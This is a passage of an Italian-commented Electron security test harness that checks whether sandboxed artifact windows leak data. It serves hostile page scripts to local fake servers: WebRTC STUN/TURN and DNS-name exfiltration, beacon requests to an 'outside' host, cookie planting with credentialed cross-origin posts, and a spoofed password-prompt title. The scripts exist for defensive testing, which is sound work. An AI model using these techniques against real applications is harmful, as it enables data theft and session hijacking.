/*
 * Giro di sicurezza 2 (10/11/2026) — il guscio di prova di `finestra-artefatto-rete.spec.mjs`: Electron VERO, finestre nascoste,
 *   profilo finto (PROVA_PROFILO), server finti solo su 127.0.0.1. Nessun modello, nessuna chiave. Verso fuori parte UNA cosa sola, e solo
 *   negli scenari senza la lista delle connessioni (le prove al contrario `…-nuda`, `sigillo-forzato`, e `sola-rete`, `spoglia-sola-rete`):
 *   la domanda al DNS del sistema per nomi sotto `.invalid`, che non esistono (vedi `nomeUdp` più sotto). Nessun pacchetto verso host veri.
 *   A = «TALOS» (pagine rese con la politica copiata da `src/http-app.mjs` `politicaPagina` e dalla rotta vecchia degli artefatti),
 *   B = «fuori», e per OGNI scenario un finto STUN su UDP e un finto TURN su TCP suoi (così un pacchetto in ritardo non si conta altrove).
 * Il modulo provato è quello vero (`../../finestra-artefatto.mjs`). Gli strati si tolgono uno alla volta da QUI (mai nel modulo), per
 *   misurare che ognuno regge da solo e che, senza nessuno, la sonda la fuga la vede davvero (la prova al contrario).
 * Giro di sicurezza 3 (10/11/2026): la pagina che fa cadere il suo processo (`cadute`, `finestra-crollo`, `finestra-unavolta`), il
 *   secondo ascolto delle intestazioni (`sigillo…`), l'altro nome di questa macchina (`alias…`). `PROVA_SENZA=isolamento` lancia Chromium
 *   SENZA un processo per pagina resa: è la prova al contrario di `cadute` (un secondo lancio, coi soli scenari di PROVA_SOLO).
 *   Due servizi insieme (F5) NON si curano: limite dichiarato nel CHANGELOG (chiude per difetto, mai allarga; misurato dal controllore).
 * Giro di sicurezza 5 (11/11/2026; forma `FORMA-ORIGINE-PER-PAGINA-2026-11-11.md`, giudice v1416-v1430): ogni pagina sulla SUA origine,
 *   `http://<etichetta>.localhost:<porta del servizio>` (`sullaSuaOrigine`). Il finto servizio risponde a quei nomi come il vero
 *   (`src/http-app.mjs`: `frame-ancestors` e `Allow-CSP-From` = l'app su 127.0.0.1). Scenari nuovi: `cadute` con un'etichetta per anteprima e
 *   `cadute-stessa` (tutte sull'origine del servizio: la prova al contrario, la sorella cade con la colpevole), `etichetta…` (la rete), `finestra-scaduta`
 *   (il servizio rifiuta la ricarica: la riga, mai il JSON), `biscotto…` (condizioni b e d: il biscotto di una pagina e quello dell'app), le misure
 *   `mis-…` con le etichette, e nel registro di rete i TIPI degli eventi del risolutore per i nomi delle pagine (condizione c: 0 domande al DNS).
 */
import { app, BrowserWindow, session } from 'electron';
import http from 'node:http';
import net from 'node:net';
import dgram from 'node:dgram';
import { mkdirSync, readFileSync, writeFileSync } from 'node:fs';
import { join } from 'node:path';
import { createHash } from 'node:crypto';

const PROFILO = process.env.PROVA_PROFILO;
const USCITA = process.env.PROVA_USCITA;
if (!PROFILO || !USCITA) { process.stderr.write('PROVA_PROFILO e PROVA_USCITA sono obbligatori\n'); app.exit(64); }
const SOLO = (process.env.PROVA_SOLO || '').split(',').filter(Boolean);
app.setName('talos-prova-artefatto-rete');
app.setPath('userData', PROFILO);
app.setPath('sessionData', PROFILO);
mkdirSync(PROFILO, { recursive: true });

const SENZA = (process.env.PROVA_SENZA || '').split(',').filter(Boolean);

const modulo = await import(new URL('../../finestra-artefatto.mjs', import.meta.url));
/* come `main.mjs`: prima di «ready», un processo per ogni pagina resa */
if (!SENZA.includes('isolamento')) modulo.isolaPagineRese?.(app.commandLine);
/* la regola dell'app per le anteprime cadute, il file VERO del frontend: la pagina finta dell'app lo carica come modulo */
const REGOLA_CADUTE = readFileSync(new URL('../../../frontend/src/components/anteprime-cadute.js', import.meta.url), 'utf8');

const GETTONE = 'ab'.repeat(24);
const CAP = 'C'.repeat(43);
/* giro 5: un'etichetta per pagina (32 cifre esadecimali minuscole, come `src/pagine-lasciapassare.mjs`), fissa per nome; la sua origine */
const etichettaDi = (testo) => createHash('md5').update(String(testo)).digest('hex');
const sullaSuaOrigine = (etichetta) => `http://${etichetta}.localhost:${portaA}`;
const NOME_DI_PAGINA = /^([0-9a-f]{32})\.localhost(?::\d+)?$/u;
const ospitiDellePagine = []; // i nomi `<etichetta>.localhost:<porta>` che il finto servizio ha davvero ricevuto (Chromium li ha portati a 127.0.0.1)
const eco = []; // condizioni b e d: cosa arriva al servizio (nome, biscotto, Sec-Fetch-Site) da una pagina
const attendi = (ms) => new Promise((r) => setTimeout(r, ms));
const conTetto = (p, ms = 4000) => Promise.race([p, attendi(ms).then(() => 'TETTO')]);
const ascolta = (server) => new Promise((r) => server.listen(0, '127.0.0.1', () => r(server.address().port)));

const versoB = [];
/* giro 4 (C1, la misura): `/<nome>/molte-<n>` è un sito con n cornici `sandbox="allow-scripts"` (senza stessa origine), come quello del controllore */
const molte = (n, nome) => `<title>molte</title><body>${Array.from({ length: n }, (_, i) => `<iframe sandbox="allow-scripts" src="/${nome}/cornice-${i}"></iframe>`).join('')}`;
const serverB = http.createServer((req, res) => {
  versoB.push(`${req.method} ${req.url}`);
  const m = /^\/([a-z0-9-]+)\/molte-(\d+)$/u.exec(req.url);
  res.writeHead(200, { 'Content-Type': 'text/html', 'Access-Control-Allow-Origin': '*' });
  res.end(m ? molte(Number(m[2]), m[1]) : '<title>FUORI</title>fuori');
});
const portaB = await ascolta(serverB);
const B = `http://127.0.0.1:${portaB}`;

/* la stessa politica di `politicaPagina` (src/http-app.mjs), copiata dal sorgente */
const politicaPagina = (base) => ["default-src 'none'", `script-src ${base} 'unsafe-inline' 'unsafe-eval'`, `style-src ${base} 'unsafe-inline'`,
  `img-src ${base} data: blob:`, `font-src ${base} data:`, `media-src ${base} data: blob:`, "connect-src 'none'", "form-action 'none'", "frame-src 'none'",
  "worker-src 'none'", "manifest-src 'none'", "object-src 'none'", "base-uri 'none'"].join('; ');
/* la rotta vecchia degli artefatti (src/http-app.mjs, `/api/v1/artifacts/:id`), copiata dal sorgente */
const POLITICA_VECCHIA = "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data:; font-src data:; frame-ancestors 'self'";
const POLITICA_APP = (fuori) => `default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self' data:; connect-src 'self'; frame-src 'self' http://*.localhost:${portaA} ${fuori}; object-src 'none'; base-uri 'none'; frame-ancestors 'none'; form-action 'none'`;

/* Il terzo canale è il NOME del server: `stun:<dato>.attaccante` porta il dato fuori nella domanda al DNS. I nomi di prova stanno sotto
   `.invalid` (RFC 6761: non esiste per definizione) e portano le porte dello scenario, così nel registro di rete si contano per scenario.
   ⚠ Solo negli scenari «nudi» (la prova al contrario) e in `sola-rete` la domanda parte davvero verso il DNS del sistema: è un nome che non esiste. */
const nomeUdp = (udp, tcp) => `u-${udp}x${tcp}.talos-prova.invalid`;
const nomeTcp = (udp, tcp) => `t-${udp}x${tcp}.talos-prova.invalid`;
const nomeCercato = (udp, tcp) => `p-${udp}x${tcp}.talos-prova.invalid`; // `<link rel="dns-prefetch">`: l'altro modo noto di far uscire un dato nel nome
const copioneRtc = (udp, tcp) => `const R=window.__esiti=window.__esiti||{};R.tipo=typeof RTCPeerConnection;R.candidati=[];
try{const pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:${udp}'},{urls:'turn:127.0.0.1:${udp}?transport=udp',username:'SEGRETO',credential:'x'},{urls:'turn:127.0.0.1:${tcp}?transport=tcp',username:'SEGRETO',credential:'x'},
{urls:'stun:${nomeUdp(udp, tcp)}:${udp}'},{urls:'turn:${nomeTcp(udp, tcp)}:${tcp}?transport=tcp',username:'SEGRETO',credential:'x'}]});pc.createDataChannel('x');
pc.onicecandidate=e=>{if(e.candidate)R.candidati.push(e.candidate.type+':'+e.candidate.protocol)};pc.onicecandidateerror=e=>{R.errore=e.errorCode+' '+e.errorText};
pc.createOffer().then(o=>pc.setLocalDescription(o)).then(()=>R.offerta='OK',e=>R.offerta='ERR '+e.name)}catch(e){R.crea='ERR '+e.name}
for(const rel of ['dns-prefetch','preconnect']){const l=document.createElement('link');l.rel=rel;l.href='//${nomeCercato(udp, tcp)}/';document.head.append(l)}`;
const copioneRete = (nome) => `const Q=window.__esiti=window.__esiti||{};
fetch('${B}/${nome}/fetch',{mode:'no-cors'}).then(()=>Q.fetch='OK',()=>Q.fetch='ERR');
const im=new Image();im.onload=()=>Q.img='OK';im.onerror=()=>Q.img='ERR';im.src='${B}/${nome}/img.png';
try{const ws=new WebSocket('ws://127.0.0.1:${portaB}/${nome}/ws');ws.onopen=()=>Q.ws='OPEN';ws.onerror=()=>Q.ws='ERR'}catch(e){Q.ws='THROW '+e.name}
const pre=document.createElement('link');pre.rel='preconnect';pre.href='${B}/';document.head.append(pre);`;

/* Giro 3, N1: la pagina che fa cadere il suo processo. La cornice FIGLIA `srcdoc` eredita la lista delle connessioni e crea `RTCPeerConnection`. */
/* condizioni b e d: la pagina prova a posare un biscotto `Domain=localhost` col nome di quello dell'app, e chiama l'app (fetch GET, POST semplice,
   immagine, modulo) con le credenziali. Cosa arriva lo conta il servizio (`eco`). */
const copioneBiscotto = (nome) => `const E=window.__esiti={};
try{document.cookie='talos_token=dalla-pagina; Domain=localhost; Path=/';document.cookie='talos_token=dalla-pagina-qui; Path=/';E.letto=document.cookie}catch(e){E.scrittura='ERR '+e.name}
const A='http://127.0.0.1:'+location.port, L='http://localhost:'+location.port, q=(via)=>'/api/v1/eco?n=${nome}&via='+via;
const vai=(u,o)=>fetch(u,o).then(r=>r.status,e=>'ERR');
Promise.all([vai(A+q('fetch-get'),{credentials:'include'}),vai(A+q('fetch-post'),{method:'POST',mode:'no-cors',credentials:'include',headers:{'Content-Type':'text/plain'},body:'x'}),
 vai(L+q('alias-get'),{mode:'no-cors',credentials:'include'})]).then(v=>{E.fetch=v});
const im=new Image();im.src=A+q('img');
const m=document.createElement('form');m.method='POST';m.action=A+q('modulo');m.target='bersaglio';m.enctype='text/plain';document.body.append(m);try{m.submit()}catch(e){E.modulo='ERR '+e.name}`;
const attributo = (testo) => testo.replace(/&/gu, '&amp;').replace(/"/gu, '&quot;');
const BATTITO = '<script>window.__esiti={vivo:0};setInterval(()=>{window.__esiti.vivo+=1},100)</script>';
const paginaCheCade = (udp, tcp) => `<title>crollo</title><body>${BATTITO}<iframe srcdoc="${attributo(`<script>${copioneRtc(udp, tcp)}</script>`)}"></iframe>`;
const paginaInnocua = `<title>sorella</title><body>${BATTITO}<p>innocua</p>`;
const richieste = new Map(); // `<genere>-<nome>` → quante volte il servizio ha dato quella pagina (le ricariche si contano QUI, non nella pagina)
const chieste = (nome) => Object.fromEntries(['crollo', 'unavolta', 'sorella'].map((genere) => [genere, richieste.get(`${genere}-${nome}`) ?? 0]));

/* i nomi delle pagine portano le porte dello scenario (il modulo non ammette `?…` nel nome): `<genere>-<nome>-<udp>-<tcp>.html` */
function pagina(genere, nome, udp, tcp, volta) {
  if (genere === 'crollo') return paginaCheCade(udp, tcp);
  if (genere === 'unavolta') return volta === 1 ? paginaCheCade(udp, tcp) : paginaInnocua; // cade solo la prima volta: dopo la ricarica resta
  if (genere === 'sorella') return paginaInnocua;
  if (genere === 'attende') return `<title>attende</title><body><script>window.__esiti={};window.__vai=()=>{location.href='arrivo-${nome}-${udp}-${tcp}.html'}</script>`;
  if (genere === 'webrtc' || genere === 'sciolta') return `<title>webrtc</title><link rel="stylesheet" href="stile.css"><img id="i" src="punto.svg"><script src="parte.js"></script><script>${copioneRtc(udp, tcp)};R.parte=window.__parte??null;addEventListener('load',()=>{R.img=document.getElementById('i').naturalWidth;R.stile=getComputedStyle(document.body).marginTop})</script>`;
  if (genere === 'nuda') return `<title>nuda</title><body><script>${copioneRtc(udp, tcp)};${copioneRete(nome)}</script>`;
  if (genere === 'parte') return `<title>parte</title><script>setTimeout(()=>{location.href='arrivo-${nome}-${udp}-${tcp}.html'},200)</script>`;
  if (genere === 'arrivo') return `<title>arrivato</title><script>window.__esiti={arrivato:true}</script>`;
  if (genere === 'titolo') return `<title>Accesso a TALOS \u202egnp.exe — Impostazioni di sistema — Inserisci la password ${'x'.repeat(200)}</title><p>titolo</p>`;
  /* giro 5: la prima volta cade, poi il lasciapassare è scaduto (il servizio dà il suo 404 JSON) */
  if (genere === 'scade') return volta === 1 ? paginaCheCade(udp, tcp) : null;
  if (genere === 'biscotto' || genere === 'biscottonudo') return `<title>biscotto</title><body><iframe name="bersaglio"></iframe><script>${copioneBiscotto(nome)}</script>`;
  if (genere === 'trattiene') return `<title>trattiene</title><body><p>resta</p><script>window.__esiti={};window.addEventListener('beforeunload',e=>{window.__esiti.chiesto=true;e.preventDefault();e.returnValue='resta';return 'resta'});</script>`;
  return null;
}
const SENZA_POLITICA = new Set(['nuda', 'trattiene', 'biscottonudo']); // come se la politica del server si fosse persa: gli strati del guscio reggono da soli?
const SENZA_ANTENATI = new Set(['sciolta']); // come se il servizio avesse perso `frame-ancestors 'self'`: sull'altro nome regge ancora il guscio?

/* la pagina finta dell'app con TRE anteprime (una che cade sempre, una che cade solo la prima volta, una innocua) e la regola vera delle cadute */
const COPIONE_CADUTE = `import { guardaAnteprima } from '/moduli/anteprime-cadute.js';
const domanda = new URLSearchParams(location.search);
const stato = window.__cadute = {};
for (const nome of ['colpevole', 'unavolta', 'sorella']) {
  const posto = document.getElementById('posto-' + nome);
  const s = stato[nome] = { ricariche: 0, arrese: 0, riga: false };
  let cornice = null;
  const metti = () => { cornice = document.createElement('iframe'); cornice.setAttribute('sandbox', 'allow-scripts'); cornice.id = nome; cornice.src = domanda.get(nome); posto.replaceChildren(cornice); s.riga = false; };
  const guardia = guardaAnteprima({ indirizzo: () => cornice?.src, ricarica: () => { s.ricariche += 1; metti(); },
    arresa: () => { s.arrese += 1; s.riga = true; cornice = null; posto.replaceChildren(document.createTextNode('Page not loaded.')); } });
  s.riprova = () => { guardia.azzera(); metti(); };
  metti();
}`;

function servizio(req, res) {
  const url = new URL(req.url, 'http://x');
  const origine = `http://${req.headers.host}`;
  /* giro 5, come `src/http-app.mjs`: sul nome di una pagina `frame-ancestors` e `Allow-CSP-From` sono l'app su 127.0.0.1 */
  const sulNomeDiPagina = NOME_DI_PAGINA.test(String(req.headers.host ?? ''));
  if (sulNomeDiPagina) ospitiDellePagine.push(`${req.headers.host} ${url.pathname.split('/').pop()}`);
  if (url.pathname === '/api/v1/eco') {
    eco.push({ n: url.searchParams.get('n'), via: url.searchParams.get('via'), metodo: req.method, ospite: req.headers.host, biscotto: req.headers.cookie ?? null,
      sito: req.headers['sec-fetch-site'] ?? null, origine: req.headers.origin ?? null });
    res.writeHead(204); res.end(); return;
  }
  const m = /^\/api\/v1\/pagine\/([^/]+)\/(.+)$/u.exec(url.pathname);
  if (m) {
    const antenati = sulNomeDiPagina ? A : "'self'";
    const intestazioni = { 'X-Content-Type-Options': 'nosniff', 'Cache-Control': 'private, no-store', 'Referrer-Policy': 'no-referrer',
      'Content-Security-Policy': `sandbox allow-scripts; ${politicaPagina(`${origine}/api/v1/pagine/${m[1]}/`)}; frame-ancestors ${antenati}`, 'Allow-CSP-From': sulNomeDiPagina ? A : origine };
    if (m[2] === 'stile.css') { res.writeHead(200, { ...intestazioni, 'Content-Type': 'text/css' }); res.end('body{margin-top:37px}'); return; }
    if (m[2] === 'parte.js') { res.writeHead(200, { ...intestazioni, 'Content-Type': 'text/javascript' }); res.end('window.__parte="caricata"'); return; }
    if (m[2] === 'punto.svg') { res.writeHead(200, { ...intestazioni, 'Content-Type': 'image/svg+xml' }); res.end('<svg xmlns="http://www.w3.org/2000/svg" width="7" height="7"/>'); return; }
    const p = /^([a-z]+)-([a-z0-9-]+?)-(\d+)-(\d+)\.html$/u.exec(m[2]);
    if (p) richieste.set(`${p[1]}-${p[2]}`, (richieste.get(`${p[1]}-${p[2]}`) ?? 0) + 1);
    const corpo = p && pagina(p[1], p[2], p[3], p[4], richieste.get(`${p[1]}-${p[2]}`));
    if (corpo) {
      if (SENZA_POLITICA.has(p[1])) delete intestazioni['Content-Security-Policy'];
      if (SENZA_ANTENATI.has(p[1])) intestazioni['Content-Security-Policy'] = intestazioni['Content-Security-Policy'].replace("; frame-ancestors 'self'", () => '');
      res.writeHead(200, { ...intestazioni, 'Content-Type': 'text/html; charset=utf-8' }); res.end(corpo); return;
    }
  }
  const vecchia = /^\/api\/v1\/artifacts\/v-(\d+)-(\d+)$/u.exec(url.pathname);
  if (vecchia) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8', 'X-Content-Type-Options': 'nosniff', 'Content-Security-Policy': POLITICA_VECCHIA });
    res.end(`<title>vecchia</title><script>${copioneRtc(vecchia[1], vecchia[2])}</script>`); return;
  }
  if (url.pathname === '/' && url.searchParams.has('misura')) {
    /* giro 4 (C1): la principale finta con N anteprime innocue (ognuna la sua pagina) e una cornice del Browser con K cornici chiuse */
    const nome = url.searchParams.get('nome');
    const n = Number(url.searchParams.get('anteprime')); const k = Number(url.searchParams.get('browser'));
    /* giro 5: ogni anteprima sulla sua origine (`stessa=1`: tutte su quella del servizio, il confronto) */
    const davanti = (i) => (url.searchParams.get('stessa') === '1' ? '' : sullaSuaOrigine(etichettaDi(`${nome}-${i}`)));
    const anteprime = Array.from({ length: n }, (_, i) => `<iframe sandbox="allow-scripts" src="${davanti(i)}/api/v1/pagine/${CAP}/sorella-${nome}x${i}-0-0.html"></iframe>`).join('');
    const browser = k ? `<iframe id="browser" sandbox="allow-scripts allow-same-origin allow-forms" src="${B}/${nome}/molte-${k}"></iframe>` : '';
    res.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': POLITICA_APP(B) });
    res.end(`<title>app</title><body>${anteprime}${browser}<script src="/app.js"></script>`);
    return;
  }
  if (url.pathname === '/' && url.searchParams.has('colpevole')) {
    /* la principale finta con TRE anteprime e la regola vera delle cadute (sulla radice: il guscio avvisa solo il documento dell'app) */
    res.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': POLITICA_APP(B) });
    res.end(`<title>app</title><body><div id="posto-colpevole"></div><div id="posto-unavolta"></div><div id="posto-sorella"></div><iframe id="browser" sandbox="allow-scripts allow-same-origin allow-forms" src="${B}/${url.searchParams.get('nome')}/sito"></iframe><script src="/app.js"></script><script type="module" src="/cadute.js"></script>`);
    return;
  }
  if (url.pathname === '/') {
    /* la principale finta: la politica dell'app (con `frame-src` che ammette il finto «fuori» al posto di `https:`), l'anteprima e una cornice del Browser */
    res.writeHead(200, { 'Content-Type': 'text/html', 'Content-Security-Policy': POLITICA_APP(`${B} ${ALIAS}`) });
    res.end(`<title>app</title><body><iframe id="anteprima" sandbox="allow-scripts" src="${url.searchParams.get('anteprima')}"></iframe><iframe id="browser" sandbox="allow-scripts allow-same-origin allow-forms" src="${B}/${url.searchParams.get('nome')}/sito"></iframe><script src="/app.js"></script>`);
    return;
  }
  if (url.pathname === '/cadute.js') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); res.end(COPIONE_CADUTE); return; }
  if (url.pathname === '/moduli/anteprime-cadute.js') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); res.end(REGOLA_CADUTE); return; }
  if (url.pathname === '/app.js') { res.writeHead(200, { 'Content-Type': 'text/javascript' }); res.end("window.__app={};fetch('/api/v1/health').then(r=>r.text()).then(t=>{window.__app.api=t},e=>{window.__app.api='ERR '+e.message});"); return; }
  if (url.pathname === '/api/v1/health') { res.writeHead(200, { 'Content-Type': 'application/json' }); res.end('{"ok":true}'); return; }
  res.writeHead(404, { 'Content-Type': 'application/json' }); res.end('{"ok":false}');
}
const serverA = http.createServer(servizio);
const portaA = await ascolta(serverA);
const A = `http://127.0.0.1:${portaA}`;
const ALIAS = `http://localhost:${portaA}`; // lo stesso servizio, chiamato con l'altro nome di questa macchina (F3)

/* F4: quante volte, su QUESTA sessione vera, qualcuno posa l'ascolto delle intestazioni. Si mette PRIMA che il modulo posi il suo.
   `vera` è il metodo di Electron: serve a togliere la lista da qui e a fare la prova al contrario (un secondo ascolto, senza il sigillo). */
function contaAscolti(jar) {
  const oggetto = jar.webRequest;
  const metodo = oggetto.onHeadersReceived;
  const conto = { posati: 0, vera: (...argomenti) => metodo.apply(oggetto, argomenti) };
  oggetto.onHeadersReceived = function posa(...argomenti) { conto.posati += 1; return metodo.apply(oggetto, argomenti); };
  return conto;
}
/* l'istruzione del mutante K12 del controllore, tale e quale: un altro ascolto posato altrove nel guscio */
function secondoAscolto(jar) {
  try { jar.webRequest['onHeaders' + 'Received']((dettagli, rispondi) => rispondi({})); return 'PASSATO'; } catch (e) { return `ERR ${e.message}`; }
}

/* un finto STUN (UDP) e un finto TURN (TCP) per scenario */
async function orecchie() {
  const o = { udp: 0, tcp: 0, tcpByte: 0 };
  const presa = dgram.createSocket('udp4');
  presa.on('message', () => { o.udp += 1; });
  o.portaUdp = await new Promise((r) => presa.bind(0, '127.0.0.1', () => r(presa.address().port)));
  const turn = net.createServer((c) => { o.tcp += 1; c.on('data', (d) => { o.tcpByte += d.length; }); c.on('error', () => {}); });
  o.portaTcp = await ascolta(turn);
  o.chiudi = () => { try { presa.close(); } catch { /* già chiusa */ } turn.close(); };
  return o;
}

/* il registro di rete della sessione dello scenario: quante volte Chromium ha chiesto al DNS i nomi scelti dalla pagina */
let registri = 0;
async function registroDiRete(jar, o) {
  const file = join(PROFILO, `rete-${registri += 1}.json`);
  await jar.netLog.startLogging(file, { captureMode: 'everything' });
  return async () => {
    await jar.netLog.stopLogging();
    let eventi = [];
    try { eventi = JSON.parse(readFileSync(file, 'utf8')).events ?? []; } catch { return { dnsUdp: -1, dnsTcp: -1 }; }
    const conta = (nome) => eventi.filter((e) => JSON.stringify(e.params ?? {}).includes(nome)).length;
    /* giro 5 (condizione c): per i nomi delle pagine non si conta «c'è il nome» (sta in ogni richiesta) ma i TIPI degli eventi del risolutore che lo
       nominano; gli stessi tipi per i nomi `.invalid` sono la prova al contrario (quelli il DNS li chiede davvero, negli scenari senza strati) */
    let tipi = {};
    try { tipi = Object.fromEntries(Object.entries(JSON.parse(readFileSync(file, 'utf8')).constants?.logEventTypes ?? {}).map(([n, id]) => [id, n])); } catch { tipi = {}; }
    const risolutore = (forma) => {
      const visti = {};
      for (const e of eventi) {
        const tipo = tipi[e.type] ?? String(e.type);
        if (!/HOST_RESOLVER|DNS/u.test(tipo)) continue;
        if (!forma.test(JSON.stringify(e.params ?? {}))) continue;
        visti[tipo] = (visti[tipo] ?? 0) + 1;
      }
      return visti;
    };
    return { dnsUdp: conta(nomeUdp(o.portaUdp, o.portaTcp)), dnsTcp: conta(nomeTcp(o.portaUdp, o.portaTcp)), dnsCercato: conta(nomeCercato(o.portaUdp, o.portaTcp)),
      risolutorePagine: risolutore(/[0-9a-f]{32}\.localhost/u), risolutoreInvalid: risolutore(/talos-prova\.invalid/u) };
  };
}

/* `accese`: le funzioni di Chromium davvero chieste sulla riga di comando (la prova dice se l'isolamento c'era) */
const esito = { electron: process.versions.electron, chrome: process.versions.chrome, accese: String(app.commandLine.getSwitchValue('enable-features') ?? ''), scenari: {} };
const scrivi = () => writeFileSync(USCITA, JSON.stringify(esito, null, 1));
const tettoGenerale = setTimeout(() => { esito.tetto = true; scrivi(); app.exit(2); }, 100000);
/* niente `await app.whenReady()` in cima: lanciato come file, Electron aspetta la fine del modulo prima di «ready» */
app.on('window-all-closed', () => {});
app.whenReady().then(corsa).catch((e) => { esito.errore = String(e?.stack ?? e); scrivi(); app.exit(3); });

const ATTESA = 3500; // quanto si aspetta un pacchetto che NON deve arrivare (nudo arriva in meno di un secondo)
async function finoAllaFuga(o, tetto = 15000) { const fine = Date.now() + tetto; while (Date.now() < fine && o.udp + o.tcp === 0) await attendi(100); }
/* una cornice caduta lancia già alla chiamata: si legge dentro una promessa */
const leggi = (dove, copione) => conTetto(Promise.resolve().then(() => dove.executeJavaScript(copione)).catch((e) => `ERR ${e.message}`));
const json = (testo) => { try { return JSON.parse(testo) ?? null; } catch { return null; } };
/* la memoria privata (KB) dei processi che disegnano queste cornici: quanto costa un processo per anteprima */
const memoria = (cornici) => {
  const pid = new Set(cornici.map((c) => { try { return c.osProcessId; } catch { return 0; } }).filter((p) => p > 0));
  return app.getAppMetrics().filter((m) => pid.has(m.pid)).map((m) => ({ pid: m.pid, privataKB: m.memory?.privateBytes ?? null, lavoroKB: m.memory?.workingSetSize ?? null }));
};

async function corsa() {
  let numero = 0;
  /**
   * Una finestra d'artefatto aperta dal modulo vero. `senza` toglie strati DA QUI: `lista` (l'intestazione), `proxy`, `politica` (WebRTC).
   */
  async function finestra(nome, { genere = 'webrtc', senza = [], fuga = false, dopo, carico = 10000, secondo = false, etichetta = false } = {}) {
    if (SOLO.length && !SOLO.includes(nome)) return;
    const r = esito.scenari[nome] = { righe: [] };
    const o = await orecchie();
    let chiudiRegistro = async () => ({});
    try {
      const jar = session.fromPartition(`prova-${numero += 1}-${nome}`);
      chiudiRegistro = await registroDiRete(jar, o);
      const conto = contaAscolti(jar);
      if (senza.includes('proxy')) jar.setProxy = async () => {};
      class Nascosta extends BrowserWindow {
        constructor(opzioni) {
          super({ ...opzioni, show: false });
          /* il modulo ha appena posato la lista (`proteggiSessione` viene prima): la si toglie col metodo vero di Electron, che il sigillo non vede */
          if (senza.includes('lista')) conto.vera(null);
          if (senza.includes('politica')) this.webContents.setWebRTCIPHandlingPolicy = () => {};
        }
        show() {} focus() {}
      }
      const finestre = modulo.creaFinestreArtefatto({ BrowserWindow: Nascosta, sessione: () => jar, registro: (riga) => r.righe.push(riga), lingua: 'it-IT' });
      /* giro 5: `etichetta` apre la pagina sulla sua origine, come la manda la carta nel guscio */
      const davanti = etichetta ? sullaSuaOrigine(etichettaDi(nome)) : '';
      const w = finestre.apri({ base: A, pagina: `${davanti}/api/v1/pagine/${CAP}/${genere}-${nome}-${o.portaUdp}-${o.portaTcp}.html` });
      r.aperta = Boolean(w);
      r.ascolti = conto.posati;
      if (secondo) r.secondo = secondoAscolto(jar);
      if (!w) return;
      r.cadute = 0;
      w.webContents.on('render-process-gone', () => { r.cadute += 1; });
      if (carico) r.caricata = await conTetto(new Promise((fatto) => w.webContents.once('did-finish-load', () => fatto(true))), carico);
      if (dopo) { await dopo(w, r, finestre); return; }
      if (fuga) { await finoAllaFuga(o); await attendi(1000); } else await attendi(ATTESA);
      if (!w.isDestroyed()) {
        r.politicaWebrtc = w.webContents.getWebRTCIPHandlingPolicy();
        r.titolo = w.getTitle();
        r.url = w.webContents.getURL().replace(A, 'A').replace(B, 'B').replace(/^http:\/\/[0-9a-f]{32}\.localhost:\d+/u, 'E');
        r.esiti = await leggi(w.webContents, 'JSON.stringify(window.__esiti ?? null)');
        w.destroy();
      }
    } catch (e) { r.errore = String(e?.stack ?? e); } finally {
      Object.assign(r, await chiudiRegistro().catch(() => ({ dnsUdp: -1, dnsTcp: -1 })));
      Object.assign(r, { udp: o.udp, tcp: o.tcp, tcpByte: o.tcpByte, versoB: versoB.filter((q) => q.includes(`/${nome}/`)),
        ospiti: ospitiDellePagine.filter((q) => q.includes(`-${nome}-`)).map((q) => q.replace(/^[0-9a-f]{32}\.localhost:\d+/u, 'E')),
        eco: eco.filter((q) => q.n === nome).length });
      o.chiudi(); scrivi();
    }
  }

  /** La principale finta: il documento dell'app con l'anteprima in una cornice `sandbox="allow-scripts"` e una cornice del Browser. */
  /**
   * `da` = l'origine da cui arriva l'anteprima (F3: l'altro nome della macchina); `genere` = la pagina; `dopoLaLista(jar, conto, r)` = cosa
   * succede sulla sessione DOPO che il modulo ha posato il suo ascolto (F4: un secondo ascolto).
   */
  async function principale(nome, { protetta, vecchia = false, fuga = false, da = '', genere = 'webrtc', dopoLaLista } = {}) {
    if (SOLO.length && !SOLO.includes(nome)) return;
    const r = esito.scenari[nome] = {};
    const o = await orecchie();
    let chiudiRegistro = async () => ({});
    try {
      const jar = session.fromPartition(`prova-${numero += 1}-${nome}`);
      chiudiRegistro = await registroDiRete(jar, o);
      const conto = contaAscolti(jar);
      if (protetta) modulo.chiudiRetePagineRese?.(jar, () => A);
      r.ascolti = conto.posati;
      if (dopoLaLista) dopoLaLista(jar, conto, r);
      const w = new BrowserWindow({ show: false, webPreferences: { contextIsolation: true, nodeIntegration: false, sandbox: true, session: jar } });
      w.webContents.on('did-finish-load', () => { modulo.consegnaGettoneArtefatti?.(w.webContents, A, GETTONE); });
      const anteprima = vecchia ? `/api/v1/artifacts/v-${o.portaUdp}-${o.portaTcp}` : `${da}/api/v1/pagine/${CAP}/${genere}-${nome}-${o.portaUdp}-${o.portaTcp}.html`;
      r.caricata = await conTetto(w.loadURL(`${A}/?nome=${nome}&anteprima=${encodeURIComponent(anteprima)}`).then(() => true, (e) => `ERR ${e.message}`), 10000);
      if (fuga) { await finoAllaFuga(o); await attendi(1000); } else await attendi(ATTESA);
      r.app = await leggi(w.webContents, 'JSON.stringify(window.__app ?? null)');
      r.gettoneNellApp = await leggi(w.webContents, 'String(window.__talosGuscioArtefatti?.gettone?.length ?? null)');
      r.cornici = [];
      for (const cornice of w.webContents.mainFrame.frames) {
        r.cornici.push({ url: cornice.url.replace(A, 'A').replace(B, 'B').replace(ALIAS, 'L').replace(/^http:\/\/[0-9a-f]{32}\.localhost:\d+/u, 'E').replace(/-\d+-\d+/u, ''), gettone: await leggi(cornice, 'typeof window.__talosGuscioArtefatti'),
          esiti: await leggi(cornice, 'JSON.stringify(window.__esiti ?? null)') });
      }
      w.destroy();
    } catch (e) { r.errore = String(e?.stack ?? e); } finally {
      Object.assign(r, await chiudiRegistro().catch(() => ({ dnsUdp: -1, dnsTcp: -1 })));
      Object.assign(r, { udp: o.udp, tcp: o.tcp, tcpByte: o.tcpByte, versoB: versoB.filter((q) => q.includes(`/${nome}/`)),
